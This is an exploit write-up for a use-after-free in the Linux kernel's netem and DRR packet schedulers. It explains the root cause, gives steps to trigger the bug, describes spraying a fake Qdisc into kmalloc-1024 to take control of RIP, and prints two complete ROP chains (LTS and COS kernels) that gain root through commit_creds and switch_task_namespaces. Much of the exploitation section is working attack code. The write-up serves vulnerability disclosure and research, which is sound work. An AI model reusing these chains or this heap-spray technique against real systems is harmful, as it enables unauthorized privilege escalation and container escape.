# Overview

In the `netem_dequeue()`, `sch->q.qlen` is decreased after calling `qdisc_tree_reduce_backlog()`, so it fails to notify the parent qdisc properly.

```c
static struct sk_buff *netem_dequeue(struct Qdisc *sch)
{
  ...
      if (q->qdisc) {
        unsigned int pkt_len = qdisc_pkt_len(skb);
        struct sk_buff *to_free = NULL;
        int err;

        err = qdisc_enqueue(skb, q->qdisc, &to_free);           // [1]
        kfree_skb_list(to_free);
        if (err != NET_XMIT_SUCCESS) {
          if (net_xmit_drop_count(err))
            qdisc_qstats_drop(sch);
          qdisc_tree_reduce_backlog(sch, 1, pkt_len);           // [2]
          sch->qstats.backlog -= pkt_len;
          sch->q.qlen--;
        }
        goto tfifo_dequeue;
      }
  ...
}
```

If `qdisc_enqueue()` returns an error in `netem_dequeue()` [1], it calls `qdisc_tree_reduce_backlog()` to decrease the `qlen` of the parent Qdisc [2]. At this point, `sch->q.qlen` should be decreased before calling `qdisc_tree_reduce_backlog()` to remove the class from the active list in the parent Qdisc. However, `netem_dequeue()` calls `qdisc_tree_reduce_backlog()` before reducing `sch->q.qlen`, so the decreased `qlen` value is not propagated to the parent Qdisc.

```c
void qdisc_tree_reduce_backlog(struct Qdisc *sch, int n, int len)
{
    bool qdisc_is_offloaded = sch->flags & TCQ_F_OFFLOADED;
    const struct Qdisc_class_ops *cops;
    unsigned long cl;
    u32 parentid;
    bool notify;
    int drops;

    if (n == 0 && len == 0)
        return;
    drops = max_t(int, n, 0);
    rcu_read_lock();
    while ((parentid = sch->parent)) {
        if (parentid == TC_H_ROOT)
            break;

        if (sch->flags & TCQ_F_NOPARENT)
            break;
        /* Notify parent qdisc only if child qdisc becomes empty.
        *
        * If child was empty even before update then backlog
        * counter is screwed and we skip notification because
        * parent class is already passive.
        *
        * If the original child was offloaded then it is allowed
        * to be seem as empty, so the parent is notified anyway.
        */
        notify = !sch->q.qlen && !WARN_ON_ONCE(!n &&
                            !qdisc_is_offloaded);
        /* TODO: perform the search on a per txq basis */
        sch = qdisc_lookup_rcu(qdisc_dev(sch), TC_H_MAJ(parentid));
        if (sch == NULL) {
            WARN_ON_ONCE(parentid != TC_H_ROOT);
            break;
        }
        cops = sch->ops->cl_ops;
        if (notify && cops->qlen_notify) {
            cl = cops->find(sch, parentid);
            cops->qlen_notify(sch, cl);                 // [3]
        }
        sch->q.qlen -= n;
        sch->qstats.backlog -= len;
        __qdisc_qstats_drop(sch, drops);
    }
    rcu_read_unlock();
}
```

In `qdisc_tree_reduce_backlog()`, when `qlen` becomes 0, it calls the parent Qdisc's `qlen_notify()` [3].

```c
static void drr_qlen_notify(struct Qdisc *csh, unsigned long arg)
{
    struct drr_class *cl = (struct drr_class *)arg;

    list_del(&cl->alist);                                           // [4]
}
```

`qlen_notify()` removes the Qdisc class from the active list. In `netem_dequeue()`, if child Qdisc's `qlen` is decremented to 0, `drr_qlen_notify()` is called and `list_del()` is performed [4]. However, since `qlen` is not decremented yet, the notify function is not called. Consequently, when the DRR class is deleted, it remains in the active list and is freed.

We can trigger the UAF as follows.

- Create a Qdisc DRR `1:`
- Create a Class DRR `1:1`
- Create a Qdisc NetEM `2:` with `1:1` as a parent
- Create a Qdisc NetEM `3:` with `2:1` as a parent and configured with a 100% drop rate
- Send a packet to trigger the vulnerability
- Delete the Class DRR `1:1`
- Send a packet to trigger the UAF

# KASLR Bypass

We used a timing side channel attack to leak the kernel base.

# RIP Control

RIP is controlled in `drr_dequeue()`.

```c
static struct sk_buff *drr_dequeue(struct Qdisc *sch)
    {
    struct drr_sched *q = qdisc_priv(sch);
    struct drr_class *cl;
    struct sk_buff *skb;
    unsigned int len;

    if (list_empty(&q->active))
        goto out;
    while (1) {
        cl = list_first_entry(&q->active, struct drr_class, alist);
        skb = cl->qdisc->ops->peek(cl->qdisc);                              // [5]
        if (skb == NULL) {
            qdisc_warn_nonwc(__func__, cl->qdisc);
            goto out;
        }
```

When the DRR Qdisc class is deleted, both `cl` and `cl->qdisc` are freed. At this point, with both freed, `cl` is left in its freed state and a fake qdisc is sprayed onto `cl->qdisc`. This allows control over the RIP when `cl->qdisc->ops->peek` is called [5]. Setting the fake qdisc's ops to `drr_qdisc_ops` causes the `peek` function below to be invoked.

```c
static inline struct sk_buff *qdisc_peek_dequeued(struct Qdisc *sch)
{
    struct sk_buff *skb = skb_peek(&sch->gso_skb);

    /* we can reuse ->gso_skb because peek isn't called for root qdiscs */
    if (!skb) {
        skb = sch->dequeue(sch);                                           // [6]

        if (skb) {
            __skb_queue_head(&sch->gso_skb, skb);
            /* it's still part of the queue */
            qdisc_qstats_backlog_inc(sch, skb);
            sch->q.qlen++;
        }
    }

    return skb;
}
```

In `qdisc_peek_dequeued()`, if `sch->gso_skb` is `0`, `sch->dequeue` is called [6]. Since `sch->dequeue` corresponds to the 0x8 offset in `struct Qdisc`, a stack pivot gadget can be stored at this location to perform ROP.

We allocate the `user_key_payload` and `ctl_buf` objects into `kmalloc-1024` for the fake Qdisc spray.

# Post-RIP

For LTS kernel, the ROP payload is stored in `struct Qdisc` allocated in `kmalloc-1024`. When `sch->dequeue()` is called, `RDI` points to the beginning of the `struct Qdisc`.

```c
void rop_chain(uint64_t* data){
    int i = 0;

    data[i++] = kbase + POP_POP_POP_RET;            // enqueue
    data[i++] = kbase + PUSH_RDI_POP_RSP_RET;       // dequeue

    data[i++] = 0;                                  // keylen
    data[i++] = kbase + DRR_QDISC_OPS;              // ops

    // current = find_task_by_vpid(getpid())
    data[i++] = kbase + POP_RDI_RET;
    data[i++] = getpid();
    data[i++] = kbase + FIND_TASK_BY_VPID;

    // current += offsetof(struct task_struct, rcu_read_lock_nesting)
    data[i++] = kbase + POP_RSI_RET;
    data[i++] = RCU_READ_LOCK_NESTING_OFF;
    data[i++] = kbase + ADD_RAX_RSI_RET;

    // current->rcu_read_lock_nesting = 0 (Bypass rcu protected section)
    data[i++] = kbase + POP_RCX_RET;
    data[i++] = 0;
    data[i++] = kbase + MOV_RAX_RCX_RET;

    // Bypass "schedule while atomic": set oops_in_progress = 1
    data[i++] = kbase + POP_RDI_RET;
    data[i++] = 1;
    data[i++] = kbase + POP_RSI_RET;
    data[i++] = 0;                                  // gsoskb.next

    data[i++] = kbase + POP_RSI_RET;
    data[i++] = kbase + OOPS_IN_PROGRESS;
    data[i++] = kbase + MOV_RSI_RDI_RET;

    // commit_creds(&init_cred)
    data[i++] = kbase + POP_RDI_RET;
    data[i++] = kbase + INIT_CRED;
    data[i++] = kbase + COMMIT_CREDS;

    // find_task_by_vpid(1)
    data[i++] = kbase + POP_RDI_RET;
    data[i++] = 1;
    data[i++] = kbase + FIND_TASK_BY_VPID;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    data[i++] = kbase + MOV_RDI_RAX_RET;
    data[i++] = kbase + POP_RSI_RET;
    data[i++] = kbase + INIT_NSPROXY;
    data[i++] = kbase + SWITCH_TASK_NAMESPACES;

    data[i++] = kbase + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
    data[i++] = 0;
    data[i++] = 0;
    data[i++] = _user_rip;
    data[i++] = _user_cs;
    data[i++] = _user_rflags;
    data[i++] = _user_sp;
    data[i++] = _user_ss;
}
```

For COS kernel, the ROP payload is stored in `struct Qdisc` allocated in `kmalloc-1024`. When `sch->dequeue()` is called, `RBP` points to the `struct Qdisc+0x80`.

```c
void rop_chain(uint64_t* data){
    int i = 0;

    data[i++] = 0;                                  // enqueue
    data[i++] = kbase + MOV_RSP_RBP_POP_RBP_RET;    // dequeue

    data[i++] = 0;                                  // keylen
    data[i++] = kbase + DRR_QDISC_OPS;              // ops

    i += 12;

    data[i++] = 0;                                  // gsoskb.next

    // current = find_task_by_vpid(getpid())
    data[i++] = kbase + POP_RDI_RET;
    data[i++] = getpid();
    data[i++] = kbase + FIND_TASK_BY_VPID;

    // current += offsetof(struct task_struct, rcu_read_lock_nesting)
    data[i++] = kbase + POP_RSI_RET;
    data[i++] = RCU_READ_LOCK_NESTING_OFF;
    data[i++] = kbase + ADD_RAX_RSI_RET;

    // current->rcu_read_lock_nesting = 0 (Bypass rcu protected section)
    data[i++] = kbase + POP_RCX_RET;
    data[i++] = 0;
    data[i++] = kbase + MOV_RAX_RCX_RET;

    // Bypass "schedule while atomic": set oops_in_progress = 1
    data[i++] = kbase + POP_RDI_RET;
    data[i++] = 1;
    data[i++] = kbase + POP_RSI_RET;
    data[i++] = kbase + OOPS_IN_PROGRESS;
    data[i++] = kbase + MOV_RSI_RDI_RET;

    // commit_creds(&init_cred)
    data[i++] = kbase + POP_RDI_RET;
    data[i++] = kbase + INIT_CRED;
    data[i++] = kbase + COMMIT_CREDS;

    // find_task_by_vpid(1)
    data[i++] = kbase + POP_RDI_RET;
    data[i++] = 1;
    data[i++] = kbase + FIND_TASK_BY_VPID;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    data[i++] = kbase + MOV_RDI_RAX_RET;
    data[i++] = kbase + POP_RSI_RET;
    data[i++] = kbase + INIT_NSPROXY;
    data[i++] = kbase + SWITCH_TASK_NAMESPACES;

    data[i++] = kbase + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
    data[i++] = 0;
    data[i++] = 0;
    data[i++] = _user_rip;
    data[i++] = _user_cs;
    data[i++] = _user_rflags;
    data[i++] = _user_sp;
    data[i++] = _user_ss;
}
```